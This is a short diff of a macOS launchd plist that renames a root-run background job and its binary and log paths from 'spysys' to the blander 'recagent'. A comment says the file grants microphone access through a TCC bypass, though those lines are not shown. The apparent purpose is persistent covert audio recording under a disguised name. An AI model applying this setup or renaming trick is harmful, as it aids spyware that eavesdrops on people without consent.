@@ -3,11 +3,11 @@
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>hq.bao.spysys</string>
+    <string>hq.bao.recagent</string>
 
     <key>ProgramArguments</key>
     <array>
-        <string>/usr/local/bin/spysys</string>
+        <string>/usr/local/bin/recagent</string>
     </array>
 
     <!-- CRITICAL: Directly grants microphone access permission (TCC bypass) -->
@@ -22,10 +22,10 @@
     <true/>
 
     <key>StandardOutPath</key>
-    <string>/var/log/spysys.log</string>
+    <string>/var/log/recagent.log</string>
 
     <key>StandardErrorPath</key>
-    <string>/var/log/spysys.log</string>
+    <string>/var/log/recagent.log</string>
     
     <key>UserName</key>
     <string>root</string>
